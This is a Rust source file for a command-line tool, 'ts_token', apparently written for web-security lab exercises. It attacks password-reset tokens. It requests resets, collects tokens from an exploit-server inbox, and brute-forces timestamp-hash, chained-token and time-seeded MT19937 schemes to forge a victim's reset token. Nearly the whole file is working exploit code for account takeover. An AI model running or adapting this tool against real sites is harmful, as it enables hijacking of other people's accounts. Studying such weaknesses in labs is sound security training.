fn h_get(agent: &ureq::Agent, cookie: &CookieStr, url: &str) -> (u32, String, String) {
    let mut req = agent.get(url);
    let c = cookie.lock().unwrap().clone();
    if !c.is_empty() {
        req = req.set("Cookie", &c);
    }
    match req.call() {
        Ok(resp) => {
            let st = resp.status() as u32;
            let date = resp.header("date").unwrap_or("").to_string();
            absorb_set_cookie(cookie, &resp);
            (st, resp.into_string().unwrap_or_default(), date)
        }
        Err(ureq::Error::Status(st, resp)) => (st as u32, resp.into_string().unwrap_or_default(), String::new()),
        Err(_) => (0, String::new(), String::new()),
    }
}

fn h_post(agent: &ureq::Agent, cookie: &CookieStr, url: &str, body: &str) -> (u32, String) {
    let mut req = agent
        .post(url)
        .set("Content-Type", "application/x-www-form-urlencoded");
    let c = cookie.lock().unwrap().clone();
    if !c.is_empty() {
        req = req.set("Cookie", &c);
    }
    match req.send_string(body) {
        Ok(resp) => {
            let st = resp.status() as u32;
            let date = resp.header("date").unwrap_or("").to_string();
            absorb_set_cookie(cookie, &resp);
            (st, date)
        }
        Err(ureq::Error::Status(st, _)) => (st as u32, String::new()),
        Err(_) => (0, String::new()),
    }
}

const PIN_PATTERNS: &[&str] = &[
    "php_microtime",
    "sec_dot_us6",
    "sec_us6",
    "float1",
    "float2",
    "float4r",
    "float5r",
    "float6",
    "float7",
    "float8",
    "msr",
    "msf",
    "ms_concat",
    "uniqid",
    "microtime_true_str",
];
const PIN_STRATEGIES: &[&str] = &["plain", "double", "hmac_ku", "hmac_kt", "hmac_secret", "packN"];

fn run_pin(kv: &BTreeMap<String, String>, pos: &[String]) {
    let base = pos.first().cloned().unwrap_or_default();
    if base.is_empty() {
        pi_rust_lib::report::failure("ts_token", "pin needs <base-url>", "usage: ts_token pin https://lab/ --me user --jar /tmp/j.json");
        return;
    }
    let base = base.trim_end_matches('/').to_string();
    let host = base.split("//").nth(1).and_then(|s| s.split('/').next()).unwrap_or("").to_string();
    let me = kv.get("--me").cloned().unwrap_or_else(|| "user".to_string());
    let window = kv.get("--window").and_then(|v| v.parse::<i64>().ok()).unwrap_or(2);
    let algo = kv.get("--algo").cloned().unwrap_or_else(|| "sha1".to_string());
    let pw = kv.get("--pw").cloned().unwrap_or_else(|| "peter".to_string());
    let threads = threads_for(kv);
    let patterns = split_all(kv.get("--pattern").map(|s| s.as_str()).unwrap_or(""), PIN_PATTERNS);
    let combos = split_all(kv.get("--combo").map(|s| s.as_str()).unwrap_or("all"), COMBOS);
    let cookie: CookieStr = Arc::new(Mutex::new(
        kv.get("--jar").and_then(|j| load_cookie(j, &host)).unwrap_or_default(),
    ));
    let agent = ureq::AgentBuilder::new().timeout(Duration::from_secs(10)).build();

    let (fs, fpage, _) = h_get(&agent, &cookie, &format!("{}/forgot-password", base));
    let csrf = extract_csrf(&fpage).unwrap_or_default();
    let inbox = extract_exploit_link(&fpage).unwrap_or_default();
    if csrf.is_empty() || inbox.is_empty() {
        pi_rust_lib::report::failure("ts_token", "pin could not read csrf/inbox", &format!("form_status={} inbox={}", fs, inbox));
        return;
    }
    let t_before = chrono::Utc::now().timestamp_millis();
    let (pst, pdate) = h_post(
        &agent,
        &cookie,
        &format!("{}/forgot-password", base),
        &format!("csrf={}&username={}", csrf, me),
    );
    let t_after = chrono::Utc::now().timestamp_millis();
    std::thread::sleep(Duration::from_millis(1500));
    let (ist, ibody, _) = h_get(&agent, &cookie, &inbox);
    let tokens = extract_tokens_hex(&ibody);
    let sent = extract_first_sent(&ibody);
    let target = tokens.first().cloned().unwrap_or_default();
    let sent_sec = chrono::NaiveDateTime::parse_from_str(&sent, "%Y-%m-%d %H:%M:%S")
        .map(|d| d.and_utc().timestamp())
        .unwrap_or(0);
    if target.is_empty() || sent_sec == 0 {
        pi_rust_lib::report::failure(
            "ts_token",
            "pin could not harvest a token / sent stamp",
            &format!("inbox_status={} tokens={} sent={}", ist, tokens.len(), sent),
        );
        return;
    }
    // 微秒扫描:窗口 = 邮件秒 ± window
    let sec_lo = sent_sec - window;
    let sec_hi = sent_sec + window;
    let us_lo = 0u32;
    let us_hi = 999_999u32;
    let span = (us_hi - us_lo + 1) as usize;
    let total = span * (sec_hi - sec_lo + 1) as usize;
    let start = Instant::now();
    let dl = deadline();
    let hits: Arc<Mutex<Vec<Value>>> = Arc::new(Mutex::new(Vec::new()));
    let tested = Arc::new(AtomicUsize::new(0));
    let cut = Arc::new(AtomicBool::new(false));
    let chunk = total.div_ceil(threads).max(1);
    let mut handles = Vec::new();
    for t in 0..threads {
        let from = t * chunk;
        if from >= total {
            break;
        }
        let to = ((t + 1) * chunk - 1).min(total - 1);
        let patterns = patterns.clone();
        let combos = combos.clone();
        let hits = hits.clone();
        let tested = tested.clone();
        let cut = cut.clone();
        let target = target.clone();
        let algo = algo.clone();
        let me = me.clone();
        let pw = pw.clone();
        handles.push(std::thread::spawn(move || {
            let mut local = Vec::new();
            let mut n = 0usize;
            for i in from..=to {
                if i % 4096 == 0 {
                    if let Some(dl) = dl {
                        if Instant::now() >= dl {
                            cut.store(true, Ordering::Relaxed);
                            break;
                        }
                    }
                }
                let sec = sec_lo + (i / span) as i64;
                let us = us_lo + (i % span) as u32;
                for p in &patterns {
                    let tstr = time_string(p, sec, us);
                    for c in &combos {
                        let cand = combo(c, &tstr, &me, "", &pw);
                        for st in PIN_STRATEGIES {
                            let token = match *st {
                                "plain" => hash_str(&algo, &cand),
                                "double" => hash_str(&algo, &hash_str(&algo, &cand)),
                                "hmac_ku" => hmac_sha1(me.as_bytes(), cand.as_bytes()),
                                "hmac_kt" => hmac_sha1(tstr.as_bytes(), me.as_bytes()),
                                "hmac_secret" => hmac_sha1(b"secret", cand.as_bytes()),
                                "packN" => {
                                    let mut buf = (sec as u32).to_be_bytes().to_vec();
                                    buf.extend_from_slice(me.as_bytes());
                                    hash_bytes(&algo, &buf)
                                }
                                _ => continue,
                            };
                            n += 1;
                            if token == target {
                                local.push(json!({
                                    "strategy": st, "input": cand, "pattern": p,
                                    "combo": c, "sec": sec, "us": us
                                }));
                            }
                        }
                    }
                }
            }
            tested.fetch_add(n, Ordering::Relaxed);
            hits.lock().unwrap().extend(local);
        }));
    }
    for h in handles {
        let _ = h.join();
    }
    let hits = hits.lock().unwrap().clone();
    // 计数器族:sha1(user.n) / sha1(n.user) 等(自增指针型令牌)
    let mut counter_hits: Vec<Value> = Vec::new();
    for n in 0..200_000u64 {
        for c in [
            format!("{}{}", me, n),
            format!("{}{}", n, me),
            format!("{}", n),
            format!("{}{}", me, n),
        ] {
            if hash_str(&algo, &c) == target {
                counter_hits.push(json!({"input": c, "n": n}));
            }
        }
    }
    let data = json!({
        "mode": "pin", "base": base, "me": me, "form_status": fs,
        "post_status": pst, "response_date": pdate,
        "local_before_ms": t_before, "local_after_ms": t_after,
        "inbox_status": ist, "mail_sent": sent, "mail_sent_sec": sent_sec,
        "token": target, "sec_lo": sec_lo, "sec_hi": sec_hi,
        "patterns": patterns, "combos": combos, "algo": algo,
        "strategies": PIN_STRATEGIES,
        "tested": tested.load(Ordering::Relaxed), "hits": hits,
        "counter_hits": counter_hits,
        "deadline_cut": cut.load(Ordering::Relaxed),
        "elapsed_ms": start.elapsed().as_millis() as u64,
    });
    let next = if hits.is_empty() {
        "no hit in the mailed second: widen --window or --pattern, or the scheme is not a plain hash of a time string"
    } else {
        "scheme recovered: the victim's token is forged from the bracketing generation window"
    };
    pi_rust_lib::report::success("ts_token", data, next).expect("report");
}

fn extract_tokens_hex(html: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut i = 0;
    while i + 46 <= html.len() {
        if &html[i..i + 6] == "token=" {
            let cand = &html[i + 6..i + 46];
            if cand.chars().all(|c| c.is_ascii_hexdigit()) && cand.chars().any(|c| c.is_ascii_alphabetic()) {
                let owned = cand.to_string();
                if !out.contains(&owned) {
                    out.push(owned);
                }
            }
            i += 46;
        } else {
            i += 1;
        }
    }
    out
}

fn extract_first_sent(html: &str) -> String {
    match html.find("2026-") {
        Some(pos) if pos + 19 <= html.len() => html[pos..pos + 19].to_string(),
        _ => String::new(),
    }
}

/// 链式/自指构造:令牌是否由前一个令牌(或上一个令牌+身份)派生。静态时间戳构造
/// 已被证伪时,这是“有状态生成器”的唯一可离线分辨指纹。
fn run_chain(kv: &BTreeMap<String, String>, pos: &[String]) {
    let base = pos.first().cloned().unwrap_or_default();
    if base.is_empty() {
        pi_rust_lib::report::failure("ts_token", "chain needs <base-url>", "usage: ts_token chain https://lab/ --me user --count 3");
        return;
    }
    let base = base.trim_end_matches('/').to_string();
    let me = kv.get("--me").cloned().unwrap_or_else(|| "user".to_string());
    let count = kv.get("--count").and_then(|v| v.parse::<usize>().ok()).unwrap_or(3).max(2);
    let pw = kv.get("--pw").cloned().unwrap_or_else(|| "peter".to_string());
    let algo = kv.get("--algo").cloned().unwrap_or_else(|| "sha1".to_string());
    let cookie: CookieStr = Arc::new(Mutex::new(String::new()));
    let agent = ureq::AgentBuilder::new().timeout(Duration::from_secs(10)).build();
    let (fs, fpage, _) = h_get(&agent, &cookie, &format!("{}/forgot-password", base));
    let csrf = extract_csrf(&fpage).unwrap_or_default();
    let inbox = extract_exploit_link(&fpage).unwrap_or_default();
    if csrf.is_empty() || inbox.is_empty() {
        pi_rust_lib::report::failure("ts_token", "chain could not read csrf/inbox", &format!("form_status={}", fs));
        return;
    }
    let mut posts = Vec::new();
    for _ in 0..count {
        let t0 = chrono::Utc::now().timestamp_millis();
        let (st, _) = h_post(
            &agent,
            &cookie,
            &format!("{}/forgot-password", base),
            &format!("csrf={}&username={}", csrf, me),
        );
        posts.push(json!({"status": st, "local_ms": t0}));
    }
    std::thread::sleep(Duration::from_millis(2500));
    let (ist, ibody, _) = h_get(&agent, &cookie, &inbox);
    let newest = extract_tokens_hex(&ibody);
    let sent = extract_first_sent(&ibody);
    let mut seq: Vec<String> = newest.iter().take(count).cloned().collect();
    seq.reverse(); // 旧 -> 新(生成顺序,串行请求下假定一致)
    let mut matches = Vec::new();
    for w in seq.windows(2) {
        let a = &w[0];
        let b = &w[1];
        let cands = [
            ("H(a)", hash_str(&algo, a)),
            ("H(a+me)", hash_str(&algo, &format!("{}{}", a, me))),
            ("H(me+a)", hash_str(&algo, &format!("{}{}", me, a))),
            ("H(a+pw)", hash_str(&algo, &format!("{}{}", a, pw))),
            ("H(pw+a)", hash_str(&algo, &format!("{}{}", pw, a))),
            ("H(me+a+pw)", hash_str(&algo, &format!("{}{}{}", me, a, pw))),
            ("H(a+me+pw)", hash_str(&algo, &format!("{}{}{}", a, me, pw))),
        ];
        for (label, cand) in cands {
            if &cand == b {
                matches.push(json!({"relation": label, "from": a, "to": b}));
            }
        }
        // 也统计两令牌之间的字节相似度(链式若用 XOR/截断会露出共性)
        let common = a.chars().zip(b.chars()).filter(|(x, y)| x == y).count();
        if common > 8 {
            matches.push(json!({"relation": "shared-prefix-bytes", "from": a, "to": b, "common": common}));
        }
    }
    let data = json!({
        "mode": "chain", "base": base, "me": me, "algo": algo, "count": count,
        "posts": posts, "inbox_status": ist, "newest_sent": sent,
        "tokens_in_generation_order": seq, "tokens_seen": newest.len(),
        "matches": matches,
    });
    pi_rust_lib::report::success(
        "ts_token",
        data,
        if matches.is_empty() {
            "no chain relation: the token is not derived from its predecessor either"
        } else {
            "chain relation found: the next token is computable from the previous one"
        },
    )
    .expect("report");
}

/// PHP 的 MT19937(MT_RAND_MT19937 模式)= init_genrand + 标准 twist。
struct Mt {
    st: [u32; 624],
    idx: usize,
}

impl Mt {
    fn seed32(s: u32) -> Self {
        let mut st = [0u32; 624];
        st[0] = s;
        for i in 1..624 {
            st[i] = 1812433253u32
                .wrapping_mul(st[i - 1] ^ (st[i - 1] >> 30))
                .wrapping_add(i as u32);
        }
        Mt { st, idx: 624 }
    }
    fn next32(&mut self) -> u32 {
        if self.idx >= 624 {
            for i in 0..624 {
                let y = (self.st[i] & 0x8000_0000) | (self.st[(i + 1) % 624] & 0x7fff_ffff);
                let mut nxt = self.st[(i + 397) % 624] ^ (y >> 1);
                if y & 1 != 0 {
                    nxt ^= 0x9908_b0df;
                }
                self.st[i] = nxt;
            }
            self.idx = 0;
        }
        let mut y = self.st[self.idx];
        self.idx += 1;
        y ^= y >> 11;
        y ^= (y << 7) & 0x9d2c_5680;
        y ^= (y << 15) & 0xefc6_0000;
        y ^= y >> 18;
        y
    }
}

/// 时间种子 PRNG 令牌:种子取毫秒/微秒/秒,试前几个输出值的各种拼法。
fn run_prng(kv: &BTreeMap<String, String>, pos: &[String]) {
    let target = pos.first().cloned().unwrap_or_default().to_lowercase();
    if target.is_empty() {
        pi_rust_lib::report::failure("ts_token", "prng needs <target-hash>", "usage: ts_token prng <hash> --seed-lo N --seed-hi N [--outputs 32] [--user U]");
        return;
    }
    let me = kv.get("--user").cloned().unwrap_or_else(|| "user".to_string());
    let algo = kv.get("--algo").cloned().unwrap_or_else(|| "sha1".to_string());
    let outputs = kv.get("--outputs").and_then(|v| v.parse::<usize>().ok()).unwrap_or(32);
    let seed_lo: i64 = kv.get("--seed-lo").and_then(|v| v.parse().ok()).unwrap_or(0);
    let seed_hi: i64 = kv.get("--seed-hi").and_then(|v| v.parse().ok()).unwrap_or(seed_lo);
    let start = Instant::now();
    let dl = deadline();
    let mut hits: Vec<Value> = Vec::new();
    let mut tested: usize = 0;
    let mut cut = false;
    for seed in seed_lo..=seed_hi {
        if seed % 512 == 0 {
            if let Some(dl) = dl {
                if Instant::now() >= dl {
                    cut = true;
                    break;
                }
            }
        }
        let mut mt = Mt::seed32(seed as u32);
        for k in 0..outputs {
            let full = mt.next32();
            let half = full >> 1;
            for (variant, x) in [("full32", full), ("half31", half)] {
                let dec = format!("{}", x);
                let hex = format!("{:x}", x);
                let hex8 = format!("{:08x}", x);
                let forms: Vec<String> = vec![
                    dec.clone(),
                    hex.clone(),
                    hex8.clone(),
                    format!("{}{}", me, dec),
                    format!("{}{}", dec, me),
                    format!("{}{}", me, hex),
                    format!("{}{}", hex, me),
                ];
                for f in &forms {
                    tested += 1;
                    if hash_str(&algo, f) == target {
                        hits.push(json!({"seed": seed, "output_index": k, "variant": variant, "input": f}));
                    }
                }
                let mut be = x.to_be_bytes().to_vec();
                let mut le = x.to_le_bytes().to_vec();
                let mut with_user = be.clone();
                with_user.extend_from_slice(me.as_bytes());
                be.extend_from_slice(me.as_bytes());
                le.extend_from_slice(me.as_bytes());
                for b in [be, le, with_user] {
                    tested += 1;
                    if hash_bytes(&algo, &b) == target {
                        hits.push(json!({"seed": seed, "output_index": k, "variant": variant, "input": "binary"}));
                    }
                }
            }
        }
    }
    let data = json!({
        "mode": "prng", "target": target, "user": me, "algo": algo,
        "seed_lo": seed_lo, "seed_hi": seed_hi, "outputs": outputs,
        "tested": tested, "hits": hits, "deadline_cut": cut,
        "elapsed_ms": start.elapsed().as_millis() as u64,
    });
    let next = if hits.is_empty() {
        "no time-seeded MT19937 match in this seed range"
    } else {
        "time-seeded PRNG confirmed: re-seed for the victim request window and compute the token"
    };
    pi_rust_lib::report::success("ts_token", data, next).expect("report");
}

/// 多元素全排列:身份/时间/邮箱/口令任一顺序与分隔符的组合(拼接空间系统化补全)。
fn perm_candidates(t: &str, user: &str, email: &str, pw: &str) -> Vec<String> {
    let elems: Vec<&str> = vec![user, t, email, pw];
    let seps = ["", ":", " ", "-", "_", "|"];
    let mut orders: Vec<Vec<usize>> = Vec::new();
    for a in 0..4 {
        for b in 0..4 {
            if b == a {
                continue;
            }
            orders.push(vec![a, b]);
            for c in 0..4 {
                if c == a || c == b {
                    continue;
                }
                orders.push(vec![a, b, c]);
                for d in 0..4 {
                    if d == a || d == b || d == c {
                        continue;
                    }
                    orders.push(vec![a, b, c, d]);
                }
            }
        }
    }
    let mut out = Vec::new();
    for ord in orders {
        let parts: Vec<&str> = ord.iter().map(|&i| elems[i]).filter(|s| !s.is_empty()).collect();
        if parts.len() < 2 {
            continue;
        }
        for sep in seps {
            out.push(parts.join(sep));
        }
    }
    out
}

fn selftest() {
    // hash sanity
    let h = hash_str("sha1", "abc");
    assert_eq!(h, "a9993e364706816aba3e25717850c26c9cd0d89d");
    // pattern/combo shapes
    assert_eq!(time_string("php_microtime", 1791595437, 123456), "0.12345600 1791595437");
    assert_eq!(time_string("float4r", 1791595437, 123456), "1791595437.1235");
    assert_eq!(time_string("uniqid", 1791595437, 123456).len(), 13);
    assert_eq!(combo("user_colon_t", "T", "user", "e", "p"), "user:T");
    // crack machinery: synthesize a sec-granularity target and find it
    let sec = 1_791_595_437i64;
    let input = combo("user_t", &time_string("sec_only", sec, 0), "user", "e@x", "peter");
    let target = hash_str("sha1", &input);
    let (kv, pos) = parse(&[
        "--sec-lo".into(),
        (sec - 1).to_string(),
        "--sec-hi".into(),
        (sec + 1).to_string(),
        "--user".into(),
        "user".into(),
    ]);
    let cfg = cfg_from(&kv, target.clone());
    let mut hit = false;
    for s in cfg.sec_lo..=cfg.sec_hi {
        for p in SEC_PATTERNS {
            let t = time_string(p, s, 0);
            for c in COMBOS {
                let body = combo(c, &t, &cfg.user, &cfg.email, &cfg.pw);
                for salt in SALTS {
                    let cands: Vec<String> = if salt.is_empty() {
                        vec![body.clone()]
                    } else {
                        vec![format!("{}{}", salt, body), format!("{}{}", body, salt)]
                    };
                    for cand in cands {
                        if hash_str("sha1", &cand) == target {
                            hit = true;
                        }
                    }
                }
            }
        }
    }
    assert!(hit, "selftest: synthetic sec-granularity target must be cracked");
    assert!(pos.is_empty());
    pi_rust_lib::report::success(
        "ts_token",
        json!({"selftest": "ok", "checks": ["sha1-abc", "pattern-shapes", "combo-shapes", "sec-crack"]}),
        "run: ts_token sec <hash> --sec-lo N --sec-hi N --user U",
    )
    .expect("report");
}
